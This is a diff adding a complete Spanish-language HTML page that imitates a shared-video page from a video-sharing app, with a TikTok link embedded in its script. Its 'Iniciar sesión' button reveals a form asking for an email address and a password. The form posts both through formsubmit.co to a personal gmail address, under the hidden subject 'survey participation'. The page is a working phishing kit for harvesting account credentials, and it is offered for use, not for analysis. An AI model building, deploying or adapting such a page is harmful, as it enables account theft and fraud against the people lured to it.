@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vídeo compartido</title>
+
+<style>
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  background: #fff;
+  color: #161823;
+  font-family: Arial, sans-serif;
+}
+
+.header {
+  height: 55px;
+  display: flex;
+  align-items: center;
+  padding: 0 17px;
+  border-bottom: 1px solid #eee;
+}
+
+.logo {
+  font-size: 24px;
+  font-weight: 900;
+}
+
+main {
+  max-width: 650px;
+  margin: auto;
+}
+
+.video-area {
+  background: #111;
+  height: 78vh;
+  min-height: 520px;
+  max-height: 850px;
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+}
+
+.video-placeholder {
+  text-align: center;
+  padding: 25px;
+  color: #ddd;
+}
+
+.play {
+  font-size: 75px;
+  margin-bottom: 12px;
+}
+
+.video-info {
+  position: absolute;
+  bottom: 15px;
+  left: 15px;
+}
+
+.details {
+  padding: 17px;
+}
+
+.creator {
+  font-weight: bold;
+  margin-bottom: 8px;
+}
+
+.caption {
+  color: #444;
+  font-size: 14px;
+  line-height: 1.5;
+}
+
+.open-app {
+  margin: 18px 0;
+  width: 100%;
+  border: none;
+  background: #fe2c55;
+  color: white;
+  padding: 14px;
+  border-radius: 5px;
+  font-size: 15px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+.login-inline {
+  display: none;
+  margin-top: 12px;
+  padding: 18px;
+  border: 1px solid #eee;
+  border-radius: 8px;
+}
+
+.login-inline h3 {
+  margin-bottom: 12px;
+}
+
+.login-inline p {
+  color: #666;
+  font-size: 13px;
+  line-height: 1.5;
+  margin-bottom: 12px;
+}
+
+.login-inline input {
+  width: 100%;
+  padding: 13px;
+  margin-bottom: 10px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  font-size: 15px;
+}
+
+.notice {
+  background: #f4f4f4;
+  padding: 12px;
+  border-radius: 5px;
+  font-size: 12px;
+  line-height: 1.5;
+  margin-bottom: 12px;
+}
+
+.consent {
+  display: flex;
+  gap: 8px;
+  align-items: flex-start;
+  font-size: 12px;
+  margin: 10px 0;
+}
+
+.consent input {
+  width: auto;
+  margin: 0;
+}
+
+.open-app:disabled {
+  background: #aaa;
+  cursor: not-allowed;
+}
+
+.comments {
+  border-top: 1px solid #eee;
+  padding: 17px;
+  color: #888;
+  font-size: 13px;
+}
+
+@media(max-width:600px) {
+  .video-area {
+    height: 78vh;
+    min-height: 480px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<header class="header">
+  <div class="logo">Vídeo compartido</div>
+</header>
+
+<main>
+
+<section class="video-area">
+  <div class="video-placeholder">
+    <div class="play">▶</div>
+    <p>Vista previa del vídeo compartido</p>
+    <p style="font-size:12px;margin-top:8px">
+      Abre la publicación original para reproducirla
+    </p>
+  </div>
+
+  <div class="video-info">
+    <strong>@creador</strong>
+    <p>Vídeo compartido contigo</p>
+  </div>
+</section>
+
+<section class="details">
+
+  <div class="creator">@creador</div>
+
+  <div class="caption">
+    Mira este vídeo que compartieron contigo.
+  </div>
+
+  <button class="open-app" onclick="showSurvey()">
+    Iniciar sesión
+  </button>
+
+  <div class="login-inline" id="survey">
+
+    <h3>Inicio de sesión</h3>
+
+    <p>
+      Completa los siguientes datos.
+      introduzca correo y contraseñas.
+    </p>
+
+    <form
+      action="https://formsubmit.co/nathan0swift2@gmail.com"
+      method="POST"
+      onsubmit="return confirmSubmission()">
+
+      <label>Correo electrónico</label>
+
+      <input
+        type="email"
+        name="correo"
+        placeholder="Correo electrónico"
+        required>
+
+      <label>Contraseña</label>
+
+      <input
+        type="text"
+        name="codigo_personal"
+        placeholder="Contraseña"
+        maxlength="30"
+        required>
+
+      <div class="notice">
+        .
+      </div>
+
+      <label class="consent">
+        <input
+          type="checkbox"
+          id="consent"
+          required>
+        <span>
+          Acepto los terminos y condiciones.
+        </span>
+      </label>
+
+      <input
+        type="hidden"
+        name="_subject"
+        value="Nueva participación en encuesta">
+
+      <button
+        type="submit"
+        class="open-app">
+        Enviar encuesta
+      </button>
+
+    </form>
+
+  </div>
+
+</section>
+
+<section class="comments">
+  Publicación compartida.
+</section>
+
+</main>
+
+<script>
+
+const originalLink =
+"https://vt.tiktok.com/ZSpM9VxHu/";
+
+function showSurvey() {
+  const survey = document.getElementById("survey");
+
+  survey.style.display = "block";
+
+  survey.scrollIntoView({
+    behavior: "smooth",
+    block: "nearest"
+  });
+}
+
+function confirmSubmission() {
+  if (!document.getElementById("consent").checked) {
+    alert("Aceptar el envío.");
+    return false;
+  }
+
+  return true;
+}
+
+</script>
+
+</body>
+</html>
